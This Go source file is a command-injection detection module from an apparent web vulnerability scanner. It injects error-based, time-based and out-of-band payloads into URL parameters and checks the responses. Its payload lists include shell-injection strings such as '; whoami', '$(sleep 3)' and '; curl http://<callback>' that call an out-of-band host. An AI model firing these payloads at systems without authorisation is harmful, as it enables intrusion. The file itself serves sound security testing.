package modules

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/RowanDark/0xgen/internal/atlas"
)

// CmdIModule detects OS command injection vulnerabilities.
type CmdIModule struct {
	*atlas.BaseModule
}

// NewCmdIModule creates a new command injection detection module.
func NewCmdIModule(logger atlas.Logger, oastClient atlas.OASTClient) *CmdIModule {
	base := atlas.NewBaseModule(
		"cmdi",
		"Command Injection Detection",
		"injection",
		atlas.SeverityCritical,
		logger,
		oastClient,
	)

	return &CmdIModule{
		BaseModule: base,
	}
}

// SupportsTarget checks if this module can scan the target.
func (m *CmdIModule) SupportsTarget(target *atlas.ScanTarget) bool {
	return true
}

// Scan performs command injection detection on the target.
func (m *CmdIModule) Scan(ctx context.Context, target *atlas.ScanTarget) ([]*atlas.Finding, error) {
	var findings []*atlas.Finding

	params := m.extractParameters(target)
	if len(params) == 0 {
		return findings, nil
	}

	for paramName := range params {
		// Check context cancellation
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		// Test error-based detection
		if finding := m.testErrorBased(ctx, target, paramName); finding != nil {
			findings = append(findings, finding)
			continue
		}

		// Test time-based detection
		if finding := m.testTimeBased(ctx, target, paramName); finding != nil {
			findings = append(findings, finding)
			continue
		}

		// Test with OAST callback
		if finding := m.testWithOAST(ctx, target, paramName); finding != nil {
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

func (m *CmdIModule) testErrorBased(ctx context.Context, target *atlas.ScanTarget, param string) *atlas.Finding {
	errorPayloads := []string{
		"; ls -la",
		"| ls -la",
		"& dir",
		"` ls -la `",
		"$(ls -la)",
		"; whoami",
		"| whoami",
		"& whoami",
	}

	for _, payload := range errorPayloads {
		resp, err := m.sendTestRequest(ctx, target, param, payload)
		if err != nil {
			continue
		}

		body, err := m.ReadBody(resp)
		if err != nil {
			continue
		}

		// Check for command output patterns
		if m.isCommandOutput(body) {
			return m.CreateFinding(target, "Command Injection", atlas.ConfidenceConfirmed, atlas.Evidence{
				Parameter: param,
				Location:  m.getParamLocation(target, param),
				Request:   atlas.FormatRequest(resp.Request),
				Response:  atlas.TruncateBody(body, 1000),
				Payload:   payload,
				Proof:     "Command execution output detected in response",
			})
		}
	}

	return nil
}

func (m *CmdIModule) testTimeBased(ctx context.Context, target *atlas.ScanTarget, param string) *atlas.Finding {
	delays := []struct {
		payload string
		delay   time.Duration
	}{
		{"; sleep 3", 3 * time.Second},
		{"| sleep 3", 3 * time.Second},
		{"& timeout 3", 3 * time.Second},
		{"`sleep 3`", 3 * time.Second},
		{"$(sleep 3)", 3 * time.Second},
	}

	for _, d := range delays {
		start := time.Now()
		resp, err := m.sendTestRequest(ctx, target, param, d.payload)
		elapsed := time.Since(start)

		if err != nil {
			continue
		}

		// If response took longer than expected, likely vulnerable
		if elapsed >= d.delay && elapsed < d.delay*2 {
			body, _ := m.ReadBody(resp)
			return m.CreateFinding(target, "Command Injection (Time-based)", atlas.ConfidenceConfirmed, atlas.Evidence{
				Parameter: param,
				Location:  m.getParamLocation(target, param),
				Request:   atlas.FormatRequest(resp.Request),
				Response:  atlas.TruncateBody(body, 1000),
				Payload:   d.payload,
				Proof:     fmt.Sprintf("Response delayed by %v (expected %v)", elapsed, d.delay),
			})
		}
	}

	return nil
}

func (m *CmdIModule) testWithOAST(ctx context.Context, target *atlas.ScanTarget, param string) *atlas.Finding {
	if m.BaseModule == nil || m.BaseModule.OASTClient() == nil {
		return nil
	}

	// Generate OAST callback
	callback, err := m.BaseModule.OASTClient().GeneratePayload(ctx, fmt.Sprintf("cmdi-%s", param))
	if err != nil {
		return nil
	}

	// Test with various command execution methods
	payloads := []string{
		fmt.Sprintf("; curl http://%s", callback),
		fmt.Sprintf("| curl http://%s", callback),
		fmt.Sprintf("& curl http://%s", callback),
		fmt.Sprintf("`curl http://%s`", callback),
		fmt.Sprintf("$(curl http://%s)", callback),
		fmt.Sprintf("; wget http://%s", callback),
		fmt.Sprintf("; nslookup %s", callback),
	}

	for _, payload := range payloads {
		resp, err := m.sendTestRequest(ctx, target, param, payload)
		if err != nil {
			continue
		}

		// Wait for callback
		time.Sleep(2 * time.Second)

		// Check for interactions
		interactions, err := m.BaseModule.OASTClient().CheckInteractions(ctx, fmt.Sprintf("cmdi-%s", param))
		if err != nil || len(interactions) == 0 {
			continue
		}

		body, _ := m.ReadBody(resp)
		return m.CreateFinding(target, "Command Injection (Blind)", atlas.ConfidenceConfirmed, atlas.Evidence{
			Parameter: param,
			Location:  m.getParamLocation(target, param),
			Request:   atlas.FormatRequest(resp.Request),
			Response:  atlas.TruncateBody(body, 1000),
			Payload:   payload,
			Proof:     fmt.Sprintf("Out-of-band callback received (%d interactions)", len(interactions)),
		})
	}

	return nil
}

func (m *CmdIModule) isCommandOutput(body string) bool {
	patterns := []string{
		"total ",      // ls output
		"drwx",        // directory listing
		"root",        // whoami output
		"administrator", // Windows whoami
		"volume ",     // dir output
		"/bin/",       // Unix paths
		"c:\\",        // Windows paths
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

func (m *CmdIModule) sendTestRequest(ctx context.Context, target *atlas.ScanTarget, param, payload string) (*http.Response, error) {
	// Clone target URL
	u, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}

	// Inject payload into parameter
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	// Create request
	req, err := http.NewRequestWithContext(ctx, target.Method, u.String(), nil)
	if err != nil {
		return nil, err
	}

	// Add custom headers
	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	return m.SendRequest(ctx, req)
}

func (m *CmdIModule) extractParameters(target *atlas.ScanTarget) map[string]string {
	params := make(map[string]string)

	// From target.Parameters
	for k, v := range target.Parameters {
		params[k] = v
	}

	// From URL query string
	if u, err := url.Parse(target.URL); err == nil {
		for k, v := range u.Query() {
			if len(v) > 0 {
				params[k] = v[0]
			}
		}
	}

	return params
}

func (m *CmdIModule) getParamLocation(target *atlas.ScanTarget, param string) atlas.ParamLocation {
	if strings.Contains(target.URL, "?"+param+"=") || strings.Contains(target.URL, "&"+param+"=") {
		return atlas.ParamLocationQuery
	}
	if target.Method == "POST" {
		return atlas.ParamLocationBody
	}
	return atlas.ParamLocationQuery
}
